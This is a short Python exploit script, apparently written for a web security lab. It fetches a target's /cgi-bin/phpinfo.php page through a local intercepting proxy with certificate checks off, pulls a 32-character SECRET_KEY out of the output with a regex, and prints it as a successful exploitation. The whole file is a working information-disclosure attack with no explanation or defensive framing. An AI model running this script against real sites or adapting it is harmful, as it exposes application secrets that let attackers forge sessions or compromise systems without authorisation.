import requests
import urllib3
import re
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def find_secret_key(url):
    php_info_url = url + "/cgi-bin/phpinfo.php"
    res = requests.get(php_info_url, verify=False, proxies=proxies)

    if res.status_code == 200:
        print("(+) Successfully exploited the vulnerability...")
        secret_key = re.search("[0-9a-zA-Z]{32} ", res.text).group(0)
        print("(+) The following the SECRET_KEY:", secret_key)
    else:
        print("(+) Could not exploit vulnerability.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} https://www.example.com")
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Try to exploit the vulnerability...")
    find_secret_key(url)
    
if __name__ == "__main__":
    main()